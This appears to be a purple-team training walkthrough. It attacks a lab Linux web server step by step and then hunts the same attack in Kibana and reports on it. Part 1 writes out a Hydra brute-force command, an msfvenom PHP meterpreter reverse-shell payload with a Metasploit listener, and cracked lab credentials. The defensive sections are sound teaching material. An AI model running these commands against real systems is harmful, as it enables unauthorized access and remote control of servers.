# 🎯 Red vs Blue — Purple-Team Assessment Walkthrough

> A three-part purple-team lab that walks the full attack-then-detect loop. **Part 1** runs a Red Team exploit chain against a vulnerable Linux web server (nmap → hydra → WebDAV → PHP reverse shell → flag). **Part 2** switches to the Blue Team seat and hunts the same attack in Kibana using Packetbeat data. **Part 3** compiles the findings into a report with hardening recommendations.

**Stack:** Kali Linux · Nmap · Hydra · Metasploit / msfvenom · WebDAV · ELK Stack · Kibana · Packetbeat

**Lab environment:** Kali `192.168.1.90` · ELK `192.168.1.100` · Target `192.168.1.105`

---

# 🔴 Part 1 — Red Team: Exploit the Vulnerable Server
  
## 🔍 Step 1 — Discover the IP Address of the Linux Server

In order to find the IP address of the machine, you will need to use Nmap to scan your network.

- Open the terminal and run: `nmap 192.168.1.0/24`

   ![Nmap scan showing port 80 open on 192.168.1.105](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/1_nmap.png)

From the Nmap scan we can see that port `80` is open. Open a web browser and type the IP address of the machine into the address bar.

- Open a web browser and navigate to `192.168.1.105` and press `enter`.

   ![Web browser showing the discovered site](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/2_web_discovery.png)

## 📂 Step 2 — Locate the Hidden Directory

- Navigating through different directories, you will see a reoccurring message:

  ```
  Please refer to company_folders/secret_folder for more information
  ERROR: company_folders/secret_folder/ is no longer accessible to the public
  ```

- Navigate to the directory by typing: `192.168.1.105/company_folders/secret_folder`

- The directory asks for authentication in order to access it. Reading the authentication method, it says "For ashton's eyes only."

    ![Password-protected directory prompt for Ashton's folder](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/4_password_protect.png)

## 🔨 Step 3 — Brute-Force the Directory Password

Because the folder is password protected, we need to either guess the password or brute force into the directory. In this case, it would be much more efficient to use a brute force attack, specifically Hydra.

- Using Ashton's name, run the Hydra attack against the directory:

  - Type: `hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder`

      ![Hydra command syntax against the secret_folder path](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/5_hydra_sytanx.png)

- The brute force attack may take some time. Once it finishes, you'll find the username is `ashton` and the password is `leopoldo`.

    ![Hydra revealing the password 'leopoldo' for user 'ashton'](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/6_password_discovery.png)

- Go back to the web browser and use the credentials to log in. Click the file `connecting_to_webdav`.

   ![Contents of the secret_folder after successful login](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/7_inside_secret_directory.png)

- Located inside of the WebDAV file are instructions on how to connect to the WebDAV directory, as well the user's username and hashed password.

   ![WebDAV connection instructions from the discovered file](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/8_webdav_instructions.png)

   ![WebDAV credentials with hashed password](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/8a_webdav_hash.png)

## 🔓 Step 4 — Crack the Password Hash

There are several ways to break the password hash. Here, we simply used Crack Station, to avoid waiting for `john` to crack the password.

Navigate to `https://crackstation.net`; paste the password hash and fill out the CAPTCHA; and click **Crack Hashes**.

   ![Password hash cracked via CrackStation revealing 'linux4u'](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/9_password_hash.png)

  - The password is revealed as: `linux4u`

## 🔗 Step 5 — Connect to the Server via WebDAV

This may be the most difficult part of the Red Team exercise, as it will require students to do external research on how to connect to the VM's WebDAV directory.

In addition, the instructions show an outdated IP address that the students will need to change to the IP address they discovered.

- In order to do so, students will already need to have the user name and following instructions from the `secret_folder`. Direct students to:
  - Open the `File System` shortcut from the desktop.
  - Click `Browse Network`.
  - In the URL bar, type: `dav://192.168.1.105/webdav`, and enter the credentials to log in.

    ![Connecting to the WebDAV share via the file manager](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/10_connect_to_webdav.png)

## 🐚 Step 6 — Upload a PHP Reverse Shell Payload

- To set up the reverse shell, run:

  - `msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 >> shell.php`

   ![msfvenom generating the PHP reverse shell payload](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/11_msfvenom.png)

- Run this series of commands to set up a listener:

  - `msfconsole` to launch `msfconsole`.
  - `use exploit/multi/handler`
  - `set payload php/meterpreter/reverse_tcp`
  - `show options` and point out they need to set the `LHOST`.
  - `set LHOST 192.168.1.90`
  - `exploit`

    ![Metasploit multi-handler listener started on port 4444](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/12_listener.png)

- Place the reverse shell onto the WebDAV directory.

    ![PHP reverse shell placed into the WebDAV directory](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/13_implanting_the_reverse.png)

- Now that you're logged in, connect to the WebDAV folder by navigating to `192.168.1.105/webdav`. Use the credentials that you used before, `user:ryan pass:linux4u`.

  ![Logged into the WebDAV directory in the browser](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/14_webdav.png)

- Navigate to where you first uploaded the reverse shell and click it to activate it. If it seems like the browser is hanging or loading, that means it has worked.
    - If it asks you if you'd like to save or open the PDF file, start again at the beginning of Step 5.

  ![Reverse shell activated — browser hanging while listener catches the callback](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/15_activiating_the_shell.png)

## 🏁 Step 7 — Find and Capture the Flag

- On the listener, search for the file `flag.txt` located in the `/root` directory. One approach:

  - Drop into a bash shell with the command: `shell`
  - Go to the `/` directory: `cd /`
  - Search the system for any files containing the phrase "flag" : `find . -iname flag.txt`

Students can read the file, once located, with `cat`.

   ![Contents of flag.txt viewed via the meterpreter shell](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/16_view_files.png)

| :warning: **Important Checkpoint** :warning:                     |
|------------------------------------------------------------------|
| **At this time, you should have completed the following steps:** |
| Step 1: Discover the IP address of the Linux server.             |
| Step 2: Locate the hidden directory on the server.               |
| Step 3: Brute force the password for the hidden directory.       |
| Step 4: Crack the password hash.                                 |
| Step 5: Connect to the server via WebDAV.                        |
| Step 6: Upload a PHP reverse shell payload.                      |
| Step 7: Find and capture the flag.                               |

To complete the next part of the project, you must complete steps 1-6 at a minimum. 


# 🔵 Part 2 — Blue Team: Detect the Attack in Kibana

## 📋 Instructions — Investigating the Incident

Even though you already know what you did to exploit the target, analyzing the logs is still valuable. It will teach you:
- What your attack looks like from a defender's perspective.

- How stealthy or detectable your tactics are.

- Which kinds of alarms and alerts SOC and IR professionals can set to spot attacks like yours while they occur, rather than after.

- While going through the solution file, please note that the IP addresses here need to be replaced your machine's IP addresses. 

Double-click the Google Chrome icon on the Windows host's desktop to launch Kibana. If it doesn't load as the default page, navigate to http://192.168.1.105:5601.

Start by creating a Kibana dashboard using the pre-built visualizations. Navigate to your home page, then scroll down to **Visualize and Explore Data** then **Dashboard**.

Click on **Create dashboard** in the upper left hand side. On the new page click on **Add an existing** to add the following existing reports:
- `HTTP status codes for the top queries [Packetbeat] ECS`
- `Top 10 HTTP requests [Packetbeat] ECS`
- `Network Traffic Between Hosts [Packetbeat Flows] ECS`
- `Top Hosts Creating Traffic [Packetbeat Flows] ECS`
- `Connections over time [Packetbeat Flows] ECS`
- `HTTP error codes [Packetbeat] ECS`
- `Errors vs successful transactions [Packetbeat] ECS`
- `HTTP Transactions [Packetbeat] ECS`

Your final dashboard should look similar to:

![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/Dashboard.png)

Next, get familiar with running search queries in the `Discover` screen with Packetbeat.
- On the Discover page, locate the search field.
- Start typing `source` and notice the suggestions that come up.
- Search for the `source.ip` of your attacking machine.
- Use `AND` and `NOT` to further filter you search and look for communications between your attacking machine and the victim machine.
- Other things to look for: 
	- `url`
	- `status_code`
	- `error_code`

Some helpful searches include

- `http.response.status_code : 200`
- `url.path: /company_folders/secret_folder/`
- `source.port: 4444`
- `destination.port: 4444`
- `NOT source.port: 80 and NOT source.port: 443`

![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/Searching.png)

After you create your dashboard and become familiar with the search syntax, use these tools to answer the questions below:

### 🚦 1. Identify the Offensive Traffic

Identify the traffic between your machine and the web machine:


- Staring with a few searches in the 'Discover' area, we can find some interesting interactions.

- Run `source.ip: 192.168.1.90 and destination.ip: 192.168.1.105` in which the source IP is your Kali machine and your destination machine is your web server.

- Run `url.path: /company_folders/secret_folder/`.

When did the interaction occur?

- You know when the interaction happened so we will need to change the timeline that Kibana is searching to see that time period:

![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/show-dates.png)

In your dashboard, look through the different panels and use this data to look through the results and notice the following interactions:

What responses did the victim send back?

- On our dashboard, we can see the top responses in the `HTTP status codes for the top queries [Packetbeat] ECS`

	![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/Status-codes.png)

- We can see `401`, `301`, `207`, `404` and `200` as the top responses.

- We can also see with the `HTTP Error Codes [Packetbeat] ECS` panel:

	![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/Error-code.png)

What data is concerning from the Blue Team perspective?

- We can see a connection spike in the `Connections over time [Packetbeat Flows] ECS`

  ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/Connection-spike.png)

- We can also see a spike in errors in the `Errors vs successful transactions [Packetbeat] ECS`

  ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/Error-spike.png)

### 🕵️ 2. Find the Request for the Hidden Directory

In your attack, you found a secret folder. Let's look at that interaction between these two machines.

How many requests were made to this directory? At what time and from which IP address(es)?

- On the dashboard you built, a look at your `Top 10 HTTP requests [Packetbeat] ECS` panel:

   ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/Top-folders.png)

- In this example we can see that this folder was requested `6,197` times.

Which files were requested? What information did they contain?


- We can see in the same panel that the file `connect_to_corp_server` was requested `3` times.

What kind of alarm would you set to detect this behavior in the future?

- We could set an alert that goes off for any machine that attempts to access this directory or file.

Identify at least one way to harden the vulnerable machine that would mitigate this attack.

- This directory and file should be removed from the server all together.

### 🔨 3. Identify the Brute-Force Attack

After identifying the hidden directory, you used Hydra to brute-force the target server. Answer the following questions:

Can you identify packets specifically from Hydra?

- Yes, if you are using the search function `url.path: /company_folders/secret_folder/` will show you a few conversations involving this folder.

- In the `Discovery` page, search for: `url.path: /company_folders/secret_folder/`.

Look through the results and notice that `Hydra` is identified under the `user_agent.original` section:

  ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/Hydra-Evidence.png)

How many requests were made in the brute-force attack? How many requests had the attacker made before discovering the correct password in this one? 

-   In the `Top 10 HTTP requests [Packetbeat] ECS` panel, we can see that the password protected `secret_folder` was _requested_ `6209` times, but the file inside that directory was only requested `3` times. So, out of `6209` requests, only `3` were successful. 

   **Note:** Your results will differ.

   ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/secret-folder.png)

Take a look at the `HTTP status codes for the top queries [Packetbeat] ECS` panel:

![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/HTTP-Errors.png)

- You can see on this panel the breakdown of `401 Unauthorized` status codes as opposed to `200 OK` status codes.

- We can also see the spike in both traffic to the server and error codes.

- We can see a connection spike in the `Connections over time [Packetbeat Flows] ECS`

	![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/Connection-spike.png)

- We can also see a spike in errors in the `Errors vs successful transactions [Packetbeat] ECS`

	![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/Error-spike.png)

These are all results generated by the brute force attack with Hydra.

What kind of alarm would you set to detect this behavior in the future and at what threshold(s)?

- We could set an alert if `401 Unauthorized` is returned from any server over a certain threshold that would weed out forgotten passwords. Start with `10` in one hour and refine from there.

- We could also create an alert if the `user_agent.original` value includes `Hydra` in the name.

Identify at least one way to harden the vulnerable machine that would mitigate this attack.

- After the limit of 10 `401 Unauthorized` codes have been returned from a server, that server can automatically drop traffic from the offending IP address for a period of 1 hour. We could also display a lockout message and lock the page from login for a temporary period of time from that user.

### 🔗 4. Find the WebDAV Connection

Use your dashboard to answer the following questions:

How many requests were made to this directory? 

- We can again see in the `Top 10 HTTP requests [Packetbeat] ECS` panel that the WebDAV folder was directly connected and files inside were accessed.

  ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/webdav.png)

- We can also see it in the pie charts:

  ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/WebDav-pie.png)

Which file(s) were requested?

- We can see the passwd.dav file was requested as well as a file named `shell.php`

What kind of alarm would you set to detect such access in the future?

- We can create an alert anytime this directory is accessed by a machine _other_ than the machine that should have access.

Identify at least one way to harden the vulnerable machine that would mitigate this attack.

- Connections to this shared folder should not be accessible from the web interface. 

- Connections to this shared folder could be restricted by machine with a firewall rule.

### 🐚 5. Identify the Reverse Shell and Meterpreter Traffic

To finish off the attack, you uploaded a PHP reverse shell and started a meterpreter shell session. Answer the following questions:
Can you identify traffic from the meterpreter session?

-  First, we can see the `shell.php` file in the `webdav` directory on the `Top 10 HTTP requests [Packetbeat] ECS` panel.

   ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/webdav.png)

- Remember that your meterpreter session ran over port `4444`. Port `4444` is the _default_ port used for meterpreter and the port used in all of their documentation. Because of this, many attackers forget to change this port when conducting an attack. You can construct a search query to find these packets.

- `source.ip: 192.168.1.105 and destination.port: 4444`

What kinds of alarms would you set to detect this behavior in the future?

- We can set an alert for any traffic moving over port `4444.`

- We can set an alert for any `.php` file that is uploaded to a server.

Identify at least one way to harden the vulnerable machine that would mitigate this attack.

- Removing the ability to upload files to this directory over the web interface would take care of this issue.


| :warning: **Important Checkpoint** :warning:                     |
|------------------------------------------------------------------|
| **At this time, you should have completed the following steps:** |
| Step 1: Identify the Offensive Traffic.                          |
| Step 2: Find the Request for the Hidden Directory.               |
| Step 3: Identify the Brute Force Attack.		           |
| Step 4: Find the WebDAV Connection.                              |
| Step 5: Identify the Reverse Shell and meterpreter Traffic.      |


To complete the next part of the project, you should take screen shots that represent each of the issues listed in preparation of compiling them into a report.


# 📝 Part 3 — Reporting

- **Network Topology**: What are the addresses and relationships of the machines involved?  

  - **Solution**: The following machines live on the network:
    - **Kali**: `192.168.1.90`
    - **ELK**: `192.168.1.100`
    - **Target**: `192.168.1.105`

- **Red Team**: What were the three most critical vulnerabilities you discovered? Choose the three vulnerabilities that _you_ consider to be most critical.

  - **Solution**:  While the web server suffers from several vulnerabilities, the three below are the most critical:
      - **Cryptographic Failures**: Exposure of the `secret_folder` directory and the `connect_to_corp_server` file compromised the credentials of the Web DAV folder. Cryptographic Failures is an OWASP Top 10 vulnerability.
      - **Unauthorized File Upload**: The web server allows users to upload arbitrary files — specifically, PHP scripts. This exposes the machine to the wide array of attacks enabled by malicious files.
      - **Remote Code Execution**: As a consequence of the unauthorized file upload vulnerability, attackers can upload web shells and achieve arbitrary remote code execution on the web server.
    - Additional severe vulnerabilities include:
      - Lack of mitigation against brute force attacks
      - No authentication for sensitive data, e.g., `secret_folder`
      - Plaintext protocols (HTTP and WebDAV)

- **Blue Team**: What evidence did you find in the logs of the attack? What data should you be monitoring to detect these attacks in the future?
  
  - **Solution**: A considerable amount of data is available in the logs. Specifically, evidence of the following was obtained upon inspection:
    - Traffic from attack VM to target, including unusually high volume of requests
    - Access to sensitive data in the `secret_folder` directory
    - Brute-force attack against the HTTP server
    - POST request corresponding to upload of `shell.php`

  - **Unusual Request Volume**: Logs indicate an unusual number of requests and failed responses between the Kali VM and the target. Note that `401`, `301`, `207`, `404` and `200` are the top responses.

    ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%203/Images/Status-codes.png)

    - In addition, note the connection spike in the `Connections over time [Packetbeat Flows] ECS`, as well as the spike in errors in the `Errors vs successful transactions [Packetbeat] ECS`

    ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%203/Images/Connection-spike.png)

    ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%203/Images/Error-spike.png)

  - **Access to Sensitive Data in `secret_folder`**: On the dashboard you built, a look at your `Top 10 HTTP requests [Packetbeat] ECS` panel. In this example, this folder was requested `6,197` times. The file `connect_to_corp_server` was requested `3` times.

    ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%203/Images/Top-folders.png)

  - **HTTP Brute Force Attack**: Searching for `url.path: /company_folders/secret_folder/` shows conversations involving the sensitive data. Specifically, the results contain requests from the brute-forcing tool`Hydra`, identified under the `user_agent.original` section:

      ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%203/Images/Hydra-Evidence.png)

    - In addition, the logs contain evidence of a large number of requests for the sensitive data, of which only `3` were successful. This is a telltale signature of a brute-force attack. Specifically, the password protected `secret_folder` was requested `6209` times. However, the file inside that directory was only requested `3` times. So, out of `6209` requests, only `3` were successful. 

      ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%203/Images/secret-folder.png) 

  - **WebDAV Connection & Upload of `shell.php`**: The logs also indicate that an unauthorized actor was able to access protected data in the `webdav` directory. The `passwd.dav` file was requested via `GET`, and `shell.php` uploaded via `POST`.

      ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%203/Images/webdav.png)

      ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%203/Images/WebDav-pie.png)

- **Mitigation**: What alarms should you set to detect this behavior next time? What controls should you put in place on the target to prevent the attack from happening?

  - **Solution**: Mitigation steps for each vulnerability above are provided below.
    - **High Volume of Traffic from Single Endpoint**
      - Rate-limiting traffic from a specific IP address would reduce the web server's susceptibility to DoS conditions, as well as provide a hook against which to trigger alerts against suspiciously fast series of requests that may be indicative of scanning.
    - **Access to sensitive data in the `secret_folder` directory**
      - First, the `secret_folder` directory should be protected with stronger authentication. E.g., it could be moved to a server to which only key-based SSH access from whitelisted IPs is enabled.
      - Second, the data inside of `secret_folder` should be encrypted at rest.
      - Third, Filebeat should be configured to monitor access to the `secret_folder` directory and its contents.
      - Fourth, access to `secret_folder` should be whitelisted, and access from IPs not on this whitelist, logged.
    - **Brute-force attack against the HTTP server**
      - The `fail2ban` utility can be enabled to protect against brute force attacks.
    - **POST request corresponding to upload of `shell.php`**
      - File uploads should require authentication.
      - In addition, the server should implement an upload filter and forbid users from uploading files that may contain executable code.

## 🎤 Presentation Deliverables

A sample slideshow is attached:
- [Report: Red vs. Blue Project] https://docs.google.com/presentation/d/1d07OCqkbAXL5kwCwVJrqLPtIgOWXA5t3EZfwI98rdDE/edit#slide=id.g8798eb4c44_0_0)